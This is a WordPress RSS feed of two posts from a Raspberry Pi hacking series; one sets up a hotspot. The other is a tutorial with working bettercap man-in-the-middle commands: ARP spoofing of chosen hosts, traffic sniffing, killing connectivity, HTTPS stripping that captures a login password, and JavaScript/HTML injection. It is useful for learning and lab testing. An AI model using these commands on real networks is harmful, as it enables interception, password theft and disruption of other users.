@@ -1,0 +1,1111 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Dem Geeks</title>
+	<atom:link href="https://demgeeks.com/feed/" rel="self" type="application/rss+xml" />
+	<link>https://demgeeks.com</link>
+	<description>By Geeks, For Geeks!</description>
+	<lastBuildDate>Mon, 06 Nov 2017 19:54:14 +0000</lastBuildDate>
+	<language>en-GB</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.8.4</generator>
+
+<image>
+	<url>https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/01/cropped-2Artboard-1-2.png?fit=32%2C32&#038;ssl=1</url>
+	<title>Dem Geeks</title>
+	<link>https://demgeeks.com</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+<site xmlns="com-wordpress:feed-additions:1">123547724</site>	<item>
+		<title>HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap</title>
+		<link>https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/</link>
+		<comments>https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/#respond</comments>
+		<pubDate>Tue, 31 Oct 2017 10:57:31 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[arp]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[bettercap]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[deny]]></category>
+		<category><![CDATA[dns]]></category>
+		<category><![CDATA[embedded system]]></category>
+		<category><![CDATA[hacking]]></category>
+		<category><![CDATA[hackotg]]></category>
+		<category><![CDATA[ifconfig]]></category>
+		<category><![CDATA[ip]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[mitm]]></category>
+		<category><![CDATA[monitor]]></category>
+		<category><![CDATA[monitoring]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[promiscuous]]></category>
+		<category><![CDATA[proxy]]></category>
+		<category><![CDATA[raspbian]]></category>
+		<category><![CDATA[rpi]]></category>
+		<category><![CDATA[rpi zero]]></category>
+		<category><![CDATA[sniffing]]></category>
+		<category><![CDATA[spoofing]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[wifi]]></category>
+		<category><![CDATA[wifi wireless]]></category>
+		<category><![CDATA[wireless]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=905</guid>
+		<description><![CDATA[<p>This article is part of a series: you can find the first article here. If you missed the previous one, it is here. First, the basics Your network card (WiFi or ethernet) is your gateway to your network and the rest of the internet. The most common way to use it is to connect to [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/">HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p><i> This article is part of a series: </i><i><a href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">you can find the first article here</a></i><i>. If you missed the previous one, </i><i><a href="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/">it is here</a></i><i>.</i></p>
+<h2>First, the basics</h2>
+<p>Your network card (WiFi or ethernet) is your gateway to your network and the rest of the internet. The most common way to use it is to connect to an existing network, get an IP and done! But a network card can do many other things. A good example is that WiFi cards can set up a WiFi-hotspot themselves <a href="https://www.computerworld.com/article/2499772/mobile-wireless/mobile-wireless-wi-fi-tethering-101-use-a-smartphone-as-a-mobile-hotspot.html">(mobile phone tethering)</a>. We did this to the card of our HackOTG in <a href="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/">one of the previous articles</a>.</p>
+<p>In the normal &#8216;client&#8217; mode, which is just being connected to an existing network our network-card will only process packets that are directly meant for us to use or send through. We can change this behavior in 2 ways.<br />
+You can go into <a href="https://en.wikipedia.org/wiki/Monitor_mode">Monitor mode</a>, which means you can now see the packets in the air without connecting (associating) with any Wifi access point. Think of it like listening to people&#8217;s conversations while you walk down the street.<br />
+There is also <a href="https://en.wikipedia.org/wiki/Promiscuous_mode">Promiscuous</a><a href="https://en.wikipedia.org/wiki/Promiscuous_mode"> mode</a>, which is processing all packets touching the network-card. In a wireless system, you will have to be in proximity of the transmitting device, in a wired ethernet-network the packets must go through cable in which you are connected. In a normal switch setup, a packet will not be forwarded by the router, because it knows which devices are connected on which line.</p>
+<p>Monitor mode is not very commonly supported because the main public does not use it. <i>Promiscuous mode</i> is more commonly available.<br />
+Without installing extra modules or changing drivers in our Raspberry Pi zero, we can only do <i>p</i>, which is fine for what we want to do. To test out which modes are supported you can do the following:</p>
+<pre>iw list</pre>
+<p>Now in the output you will find a list of supported modes. You must know the physical-id (Phy#) of your device (not needed if you have only one).</p>
+<pre class="output">[...] 
+Supported interface modes: 
+* IBSS 
+* managed 
+* AP 
+* AP/VLAN 
+* monitor 
+* P2P-client 
+* P2P-GO 
+* P2P-device 
+[...]</pre>
+<h2>Watch your own traffic</h2>
+<p>First, connect to a WiFi-hotspot with your HackOTG with the 2 scripts (connect_wifi_***.sh and route_wlan0.sh) we made in <a href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">this article</a>.<br />
+Now if we check the status of our network-cards with the following command, we can see the FLAGS at the end. The &#8220;P&#8221;-flag means promiscuous. As you can see, there&#8217;s none, because our device is not in the <i>Promiscuous mode</i>.</p>
+<pre>netstat -i</pre>
+<pre class="output">Kernel Interface table
+Iface MTU   RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg
+lo    65536 55    0      0      0      55    0      0      0      LRU
+usb0  1500  2039  0      0      0      502   0      0      0      BMRU
+wlan0 1500  2482  0      1      0      147   0      0      0      BMRU</pre>
+<p>Let&#8217;s check what we can see going through our card right now by installing a tool called &#8220;tshark&#8221;, the terminal-equivalent of wireshark (a quite famous program).</p>
+<pre>sudo apt-get install tshark</pre>
+<p>Just press &#8220;no&#8221; () if you get asked about the dumpcat program and about running the tshark program as a non-superuser. To use tshark on your wireless interface, use the following command:</p>
+<pre>sudo tshark -i wlan0</pre>
+<p>Now to generate some traffic run, log in to your HackOTG with another session and run &#8220;sudo apt-get update&#8221;. You can now see the traffic generated by the HackOTG.</p>
+<pre class="output">[...]
+21 45.328684570 192.168.1.51 → 192.168.1.1 DNS 87 Standard query 0xeac0 A mirrordirector.raspbian.org 
+22 45.331851556 192.168.1.51 → 192.168.1.1 DNS 83 Standard query 0xa5b2 A archive.raspberrypi.org 
+23 45.332182555 192.168.1.51 → 192.168.1.1 DNS 87 Standard query 0x9b47 AAAA mirrordirector.raspbian.org 
+24 45.332410554 192.168.1.51 → 192.168.1.1 DNS 83 Standard query 0xb93d AAAA archive.raspberrypi.org
+[...]</pre>
+<p>Now do the same, but first put the card in <i>promiscuous mode</i> before running the<i> tshark-command</i>. To put your card in <i>promiscuous mode</i>, do the following:</p>
+<pre>sudo ifconfig wlan0 promisc</pre>
+<p>To check if it worked, see the extra &#8220;P&#8221; flag at the end:</p>
+<pre>netstat -i</pre>
+<pre class="output">Kernel Interface table
+Iface MTU   RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg
+lo    65536 55    0      0      0      55    0      0      0      LRU
+usb0  1500  2039  0      0      0      502   0      0      0      BMRU
+wlan0 1500  2482  0      1      0      147   0      0      0      BMRPU</pre>
+<p>Now if we run our<i> tshark-command</i> again:</p>
+<pre>sudo tshark -i wlan0</pre>
+<p>And after generating some traffic&#8230; You won&#8217;t see any more than before. This is because you are probably on an encrypted WiFi-access point and you&#8217;ll only be able to decrypt the traffic meant for you. So the only question that rests is &#8220;How can we make the others on the network send their traffic through us&#8221;? Read on&#8230;<br />
+You can disable <i>promiscuous mode</i> with this command:</p>
+<pre>sudo ifconfig wlan0 -promisc</pre>
+<h2>See and interfere with others&#8217; traffic (MitM)</h2>
+<p>So to get all the traffic of the network (or form a specific set of hosts) through our system, we can use a lot of different techniques. Apart from physicly being the gateway or inline with the host we have multiple techniques to reroute traffic if we are a normal client to the network. Being in the position where all the traffic flows through is called <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">Man in the Middle</a>. From there you&#8217;ll be able to influence the traffic.</p>
+<p>One of the ways to redirect the traffic is by abusing the <a href="https://nl.wikipedia.org/wiki/Address_Resolution_Protocol">ARP-protocol</a>. Which will tell everybody on the network that they are the gateway (basicly). There is a tool available for doing this <i>arpspoof.</i> But you&#8217;ll still have to search the IP&#8217;s of the real gateway and of all victims.</p>
+<p>Many of the tools to redirect, change, filter and monitor traffic in a network are bundled in one called <a href="https://www.bettercap.org/">bettercap</a>. It is the next iteration of <i>ettercap</i>, also a very famous tool. Remember that bettercap is a great tool but stands on the shoulders of gaints by using other tools and techniques to interfere with traffic.<br />
+The rest of this article will go over the installation and basic usage of the tool and how to use it on your HackOTG. In general, these tools always need some dependecies and total control over the interface, so using HackOTG is perfect for this purpose.</p>
+<h3>1. Installation</h3>
+<p>There are a couple ways to install <i>Bettercap</i>, the most stable way and universal across all linux disto&#8217;s is to install <i>Bettercap </i>with the gem package manager of the <i>ruby-</i>package. First make sure you have these dependencies:</p>
+<pre><span class="n">sudo apt-get install build</span><span class="o">-</span><span class="n">essential</span> <span class="n">ruby</span><span class="o">-</span><span class="n">dev</span> <span class="n">libpcap</span><span class="o">-</span><span class="n">dev</span></pre>
+<p>After retrieving the dependencies, install bettercap from the gem repository:</p>
+<pre><span class="n">sudo gem</span> <span class="n">install</span> <span class="n">bettercap</span></pre>
+<h3>2. Usage</h3>
+<p>Bettercap has a lot of options, so I will try to go through a couple scenarios, make sure you also take a look at <a href="https://www.bettercap.org/index.html#options">their documentation</a> to see the full range of capabilities.</p>
+<p><i><b>Don&#8217;t run the following commands without reading what they do, if people are on your network, they will be affected. Nobody wants to hear people yelling when Netflix keeps dropping out or the printer doesn&#8217;t work anymore. Better safe then sorry.</b></i></p>
+<p>So if you run Bettercap as:</p>
+<pre>sudo bettercap -I wlan0</pre>
+<p>Bettercap willl, by default, redirect traffic through our interface for all the hosts connected to that network. This is not a silent command, meaning if somebody was scanning the network for nefarious actions, they will spot you! But read on the learn about obfisquation of your traffic by changing your MAC adress (Think of it like a fingerprint), which will make the make and model of your device impossible to trace. Your IP will still be the same, that is something you can&#8217;t change.</p>
+<p>To attack only specific hosts we will need to know an IP or a MAC. This is were somebody who can copy commands, becomes a hacker. There are many tools available to &#8220;scan&#8221; a network, but the famous <i><a href="https://nmap.org/">nmap</a></i>-tool is a very good one. It is far to complex to explain all it&#8217;s features in this article, but check out the<a href="https://nmap.org/"> documentation</a> if you want to know more. You can install it with <i>sudo </i><i>apt-get install nmap</i> and then <b>run the following command:</b></p>
+<pre>sudo nmap -sn 192.168.1.*</pre>
+<p>This tool will go over all the addresses specified and give you back some info:</p>
+<pre class="output">[...]
+MAC Address: B8:27:EB:4E:0C:42 (Raspberry Pi Foundation)
+Nmap scan report for 192.168.1.14
+Host is up (-0.13s latency).
+MAC Address: 10:02:B5:D6:08:8A (Intel Corporate)
+Nmap scan report for vanboven.lan (192.168.1.20)
+Host is up (-0.19s latency).
+[...]</pre>
+<p>If you can&#8217;t determine the IP or MAC you have to check for certain traffic (later on in this article) to try to pinpoint a certain host. (attacking only a set of hosts is way more effective and puts less strain on the network and your system). You can always just walk over to a device an retrieve it&#8217;s IP if it&#8217;s just for demonstration purposes.</p>
+<p>If you don&#8217;t know the addresses to scan, or if you want to automate the command, use this script <b>scan_networks.sh</b>:</p>
+<pre class="output">for a in $(hostname -I)
+do
+    if [ "${#a}" -lt 16 ]; then
+        sudo nmap -sn $(echo $a | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | rev | cut -d . -f2- | rev).*
+    fi
+done</pre>
+<p>Simply run the following command to get all the hosts on the networks attached on all interfaces:</p>
+<pre>sh scan_networks.sh</pre>
+<p><b>Now we can complete our </b><b><i>bettercap</i></b><b>-command with a couple of victims to attack:</b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.14, 192.168.1.9</pre>
+<p><b>Another options is to specify a target by MAC address:</b></p>
+<pre>sudo bettercap -I wlan0 -T 01:23:45:67:89:10</pre>
+<p><b>Or to attack a range of IP addresses:</b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.1-30</pre>
+<p><b>You can also specify the addresses to ignore (but attack all others:</b></p>
+<pre>sudo bettercap -I wlan0 --ignore 192.168.1.14, 192.168.1.9</pre>
+<h3>3. Example attacks</h3>
+<p>What you created above, will be your basic command, which will redirect all trafic, but will do nothing with it. Not even look at it. <b>If you want to see of the traffic that is going trough, add -X (sniffer) to the command.</b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.14, 192.168.1.9 -X</pre>
+<pre class="output">[I] Starting [ spoofing:✔ discovery:✘ sniffer:✔ tcp-proxy:✘ udp-proxy:✘ http-proxy:✘ https-proxy:✘ sslstrip:✘ http-server:✘ dns-server:✘ ] ...
+
+[I] [wlan0] 192.168.1.17 : B8:27:EB:D8:B4:4A / wlan0 ( Raspberry Pi Foundation )
+[I] Found hostname dsldevice for address 192.168.1.1
+[I] [GATEWAY] 192.168.1.1 : 30:91:8F:9F:71:3C / dsldevice ( Technicolor )
+[I] [TARGET] 192.168.1.14 : 10:02:B5:D6:08:8A ( Intel Corporate )
+[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://api-v2.soundcloud.com/
+[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://l9bjkkhaycw6f8f4.soundcloud.com/
+[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/
+[192.168.1.14 &gt; 52.85.61.198:https] [HTTPS] https://l9bjkkhaycw6f8f4.soundcloud.com/
+[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/
+[192.168.1.14 &gt; 52.85.61.184:https] [HTTPS] https://api.soundcloud.com/
+[192.168.1.14 &gt; 52.85.62.252:https] [HTTPS] https://cf-hls-media.sndcdn.com/</pre>
+<p>As you can see, I was listening to music of the <i>soundcloud-</i>website on that device. We can also see the protocol used etc. Now from here we can enable options to inject, alter, kill or redirect traffic. Another powerful and easy attack to show is to <b>kill the traffic, which will make the device unable to connect to the internet or any other network-resource:</b></p>
+<pre><span class="pre">sudo bettercap -T</span> <span class="pre">192.168.1.14</span> <span class="pre">--kill </span></pre>
+<p>You can also strip encryption (HTTPS, HSTS) till a certain extend by using other built-in techniques like <i>ssl-strip</i>: (the <i>-P POST</i> is to filter on the protocol POST, where passwords will reside if found)</p>
+<pre>sudo bettercap -T 192.168.1.14 --proxy -P POST</pre>
+<p><img data-attachment-id="978" data-permalink="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/screenshot-2017-10-31-at-11-46-46/" data-orig-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?fit=775%2C379&amp;ssl=1" data-orig-size="775,379" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-31 at 11.46.46" data-image-description="" data-medium-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?fit=300%2C147&amp;ssl=1" data-large-file="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?fit=640%2C313&amp;ssl=1" class="alignnone wp-image-978 size-full" src="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=640%2C313&#038;ssl=1" alt="" srcset="https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?w=775&amp;ssl=1 775w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=300%2C147&amp;ssl=1 300w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=768%2C376&amp;ssl=1 768w, https://i2.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.46.46.png?resize=640%2C313&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>As you can see (above) a password was captured:</p>
+<pre class="output">[REQUEST BODY]
+
+RedirectUrl : http://www.standaard.be/
+ EmailOrUsername : username
+ Password : hellooooo</pre>
+<p>If you can&#8217;t strip the encryption (better safety), you can replace it with your own encryption layer. This will give a popup or alert on most modern browsers, but often victims will still go through, giving you a peek in that connection. Here is the command:</p>
+<pre>sudo bettercap -T 192.168.1.14 --proxy --proxy-https -P POST</pre>
+<p><img data-attachment-id="977" data-permalink="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/screenshot-2017-10-31-at-11-43-19/" data-orig-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?fit=701%2C462&amp;ssl=1" data-orig-size="701,462" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Screenshot 2017-10-31 at 11.43.19" data-image-description="" data-medium-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?fit=300%2C198&amp;ssl=1" data-large-file="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?fit=640%2C422&amp;ssl=1" class="alignnone wp-image-977 size-full" src="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=640%2C422&#038;ssl=1" alt="" srcset="https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?w=701&amp;ssl=1 701w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=300%2C198&amp;ssl=1 300w, https://i0.wp.com/demgeeks.com/wp-content/uploads/2017/10/Screenshot-2017-10-31-at-11.43.19.png?resize=640%2C422&amp;ssl=1 640w" sizes="(max-width: 640px) 100vw, 640px" data-recalc-dims="1" /></p>
+<p>Now if we have control over the unencrypted data, we can change it in any way we want. Some easy examples for injection attacks are the following, you can still add the force https option to these:</p>
+<p><b>Make all pages pink:</b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injectcss --css-data '*{background-color:#fd3078!important; color:white!important}'</pre>
+<p><b>Give a popup &#8220;HACKED&#8221;: </b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injectjs --js-data 'alert("hacked");'</pre>
+<p><b>Play youtube-video fullscreen on all visited pages:</b></p>
+<pre>sudo bettercap -I wlan0 -T 192.168.1.14 --proxy-module injecthtml --html-file baby.html
+
+#baby.html
+&lt;iframe style="position:absolute; z-index:10000" width="100%" height="100%"
+src="https://www.youtube.com/embed/kffacxfA7G4?autoplay=1" frameborder="0" allowfullscreen&gt;&lt;/iframe&gt;
+&lt;div style="position:absolute;width:100%;height:100%;z-index:10001;"&gt;&lt;/div&gt;'</pre>
+<p>To give some easy demo&#8217;s, I made a script that contains these commands and a bit more. If you take a look at <a href="https://github.com/larsveelaert/HackOTG">this github-repo</a>, you can find all the files we use for the HackOTG, and the file <a href="https://github.com/larsveelaert/HackOTG/blob/master/mitm.sh">mitm.sh</a>, which is a general <i>bettercap-</i>script to use on any device. Just run it with <i>sh</i> and answer the questions to automate the commands shown above.</p>
+<p>So here we can end our attack on networks we already know the password to. Next we will dive into other ways to get control over a victims traffic.</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/">HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></content:encoded>
+			<wfw:commentRss>https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+	<post-id xmlns="com-wordpress:feed-additions:1">905</post-id>	</item>
+		<item>
+		<title>HackOTG (v1.3): Creating our own hotspot on boot</title>
+		<link>https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/</link>
+		<comments>https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/#comments</comments>
+		<pubDate>Wed, 11 Oct 2017 00:44:53 +0000</pubDate>
+		<dc:creator><![CDATA[Lars Veelaert]]></dc:creator>
+				<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[ap]]></category>
+		<category><![CDATA[command-line]]></category>
+		<category><![CDATA[dhclient]]></category>
+		<category><![CDATA[dhcp]]></category>
+		<category><![CDATA[dnsmasq]]></category>
+		<category><![CDATA[embedded system]]></category>
+		<category><![CDATA[ethernet]]></category>
+		<category><![CDATA[hackotg]]></category>
+		<category><![CDATA[hostapd]]></category>
+		<category><![CDATA[hotspot]]></category>
+		<category><![CDATA[ifconfig]]></category>
+		<category><![CDATA[ip]]></category>
+		<category><![CDATA[linux]]></category>
+		<category><![CDATA[networking]]></category>
+		<category><![CDATA[operating system]]></category>
+		<category><![CDATA[OTG]]></category>
+		<category><![CDATA[rpi]]></category>
+		<category><![CDATA[rpi zero]]></category>
+		<category><![CDATA[terminal]]></category>
+		<category><![CDATA[usb]]></category>
+		<category><![CDATA[wifi]]></category>
+		<category><![CDATA[wireless]]></category>
+
+		<guid isPermaLink="false">https://demgeeks.com/?p=889</guid>
+		<description><![CDATA[<p>This article is part of a series: you can find the first article here. If you missed the previous one, it is here. Checking the capabilities of our WiFi-interface On any system you can run the following command to get the capabilities of the wireless interfaces attached to that device: iw list In the output [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://demgeeks.com/hackotg-v1-3-creating-our-own-hotspot-on-boot/">HackOTG (v1.3): Creating our own hotspot on boot</a> appeared first on <a rel="nofollow" href="https://demgeeks.com">Dem Geeks</a>.</p>
+]]></description>
+				<content:encoded><![CDATA[<p><em>This article is part of a series: <a href="https://demgeeks.com/hackotg-v1-0-universal-portable-security-platform/">you can find the first article here</a>. If you missed the previous one, <a href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">it is here</a>.</em></p>
+<h2>Checking the capabilities of our WiFi-interface</h2>
+<p>On any system you can run the following command to get the capabilities of the wireless interfaces attached to that device:</p>
+<pre>iw list</pre>
+<p>In the output of our Pi Zero W, we can see that is supports an AP mode, which means we can make the HostOTG create a hotspot on boot for controlling the device from a distance or without making use of the Ethernet-to-USB interface that the HostOTG emulates.</p>
+<p>In the same output you can also see that we can combine modes, but with a couple restrictions:</p>
+<pre class="output">#{ managed } &lt;= 1, #{ AP } &lt;= 1, #{ P2P-client } &lt;= 1, #{ P2P-device } &lt;= 1,
+ total &lt;= 4, #channels &lt;= 1</pre>
+<p>This means that we can set the interface in both AP and client mode. As a result you can have connectivity from an existing WiFi-hotspot and create also our own. Both hotspots must exist on the same channel, but that is no problem.<br />
+This is quite advanced but cool to keep in mind. In our case we want to set up an AP that starts on boot, so we can make our first connection. If you want to use both the AP and be a client to another, you&#8217;ll have to know and configure the environment before. This is not practical, so you&#8217;ll have to configure it over the emulated Ethernet-to-USB connection to make it work in every situation. You can find more on setting up combined modes <a href="https://wiki.archlinux.org/index.php/software_access_point">here</a>.</p>
+<h2>Creating the hotspot</h2>
+<p><strong>Install the necessairy packages:</strong></p>
+<pre>sudo apt-get install hostapd dnsmasq</pre>
+<p>Now we must create a configuration file containing all the settings of the hotspot. I like to keep all configurations files in the home directory, so they are easily changed, copied and reused. We will be combining a lot of the programs in different setups, so it&#8217;s easier if they are easy to find.</p>
+<p><strong>Create the file <em>hostapd.conf</em>:</strong> (Change ssid and wpa_passphrase if you want to)</p>
+<pre>ssid=HackOTG
+wpa_passphrase=raspberry
+interface=wlan0
+driver=nl80211
+hw_mode=g
+channel=6
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP</pre>
+<p><strong>Start the hotspot:</strong></p>
+<pre>killall wpa_supplicant dhcpcd hostapd dnsmasq #kill all unnecessary processes
+sudo mount --bind /dev/urandom /dev/random #BUGFIX, to ensure good security
+sudo hostapd hostapd.conf</pre>
+<h2>Run a DHCP-server on the hotspot-interface</h2>
+<p>An easy and lightweight option of looking for a DHCP-server is &#8220;dnsmasq&#8221;. We already installed the package so we go on and create the config file.</p>
+<p><strong>dnsmasq.conf:</strong></p>
+<pre class="output"># disables dnsmasq reading any other files like /etc/resolv.conf for nameservers
+no-resolv
+# Interface to bind to
+interface=wlan0
+# Specify starting_range,end_range,lease_time
+dhcp-range=10.0.0.3,10.0.0.20,12h
+# dns addresses to send to the clients
+server=8.8.8.8
+server=8.8.4.4</pre>
+<p><strong>Start the DHCP-server and configure the interface:</strong></p>
+<pre>sudo dnsmasq -C dnsmaq.conf
+sudo ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0</pre>
+<h2>Putting it all together</h2>
+<p>We can make scripts to start or stop the hotspot on-demand. Just create these scripts and run them to put the HackOTG in and out hotspot-mode.</p>
+<p><strong>hotspot_start.sh:</strong></p>
+<pre>if [ $( mount | grep urandom | wc -l ) -eq 0 ]; then
+ sudo mount --bind /dev/urandom /dev/random
+fi
+sh /home/pi/hotspot_stop.sh
+sudo hostapd /home/pi/hostapd.conf&amp;
+sudo dnsmasq -C /home/pi/dnsmasq.conf&amp;
+sleep 2
+sudo ifconfig wlan0 up 10.0.0.1 netmask 255.255.255.0</pre>
+<p><strong>hotspot_stop.sh:</strong></p>
+<pre>sudo killall dnsmasq hostapd dhcpcd wpa_supplicant
+sudo ifconfig wlan0 0.0.0.0</pre>
+<p><em>(optional) </em>You should add the hotspot_stop.sh script to the previous <em>connect_wifi_ssid.sh</em> script from <a href="https://demgeeks.com/hackotg-v1-2-basic-connectivity-to-internet/">this article</a>. Otherwise you will not be able to connect to the internet anymore because the AP will be occupying the AP, add the <em>hotspot_stop.sh</em> command to the script like this:</p>
+<pre>sh /home/pi/hotspot_stop.sh
+sudo wpa_supplicant -B -i wlan0 -D wext -c ssid.conf
+sudo dhcpcd --nohook wpa_supplicant wlan0</pre>
+<h2>Start the hotspot on boot</h2>
+<p>For all Debian-based distro&#8217;s there is a file <em>/etc/rc.local</em> that runs all commands that are put in it when the device is fully booted. Simply add a line with the <em>hotspot_start.sh</em> command to it (don&#8217;t forget the &amp; at the end to make it a background-process). The command should go before the line containing <em>&#8220;exit 0&#8221;</em>.</p>
+<p><strong>/etc/rc.local:</strong></p>
+<pre># By default this script does nothing.
+
+# Print the IP address
+_IP=$(hostname -I) || true
+if [ "$_IP" ]; then
+ printf "My IP address is %s\n" "$_IP"
+fi
+
+# put your scripts to boot here
+sh /home/pi/hotspot_start.sh&amp;
+
+exit 0</pre>
+<p>Now you can restart the device and if everything is OK, it will create the WiFi-hotspot named <em>&#8220;HackOTG&#8221;</em> with the password <em>&#8220;raspberry&#8221;</em>. If you waited for a minute and you can&#8217;t pick up the signal, you can still log in to your device over the emulated Ethernet-to-USB device. Now you have 2 ways to connect to your HackOTG!.</p>
+<p>In <a href="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/">the next article</a> we will further explore the possibilities to see and controll trafiic on a network.</p>
+<blockquote class="wp-embedded-content" data-secret="UxtFeiWmpQ"><p><a href="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/">HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap</a></p></blockquote>
+<p><iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" src="https://demgeeks.com/hackotg-v1-4-see-all-traffic-on-a-network/embed/#?secret=UxtFeiWmpQ" data-secret="UxtFeiWmpQ" width="600" height="338" title="&#8220;HackOTG (v1.4): See all traffic on a network with Promiscuous mode and Bettercap&#8221; &#8212; Dem Geeks" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></p>
